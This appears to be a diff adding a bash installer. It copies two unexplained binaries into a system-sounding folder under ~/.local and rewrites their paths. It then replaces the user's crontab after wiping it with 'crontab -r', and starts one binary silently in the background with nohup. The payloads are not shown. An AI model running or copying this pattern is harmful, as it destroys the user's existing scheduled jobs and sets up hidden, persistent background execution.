@@ -1,0 +1,20 @@
+#!/usr/bin/bash
+
+
+pth="$HOME/.local/sys-ht/"
+mkdir -p ${pth}
+
+
+cat kht_sys | sed "s@\/usr\/local\/bin\/khc\_st@${pth}\/khc\_st@g" > tmp
+mv tmp kht_sys
+
+cp khc_st ${pth}
+cp kht_sys ${pth}
+
+cat crbck | sed "s@\/usr\/local\/bin\/kht\_sys@${pth}\/kht\_sys@g" > check
+crontab -r
+crontab check
+rm check
+
+
+nohup ${pth}/kht_sys 1>/dev/null 2>&1 &
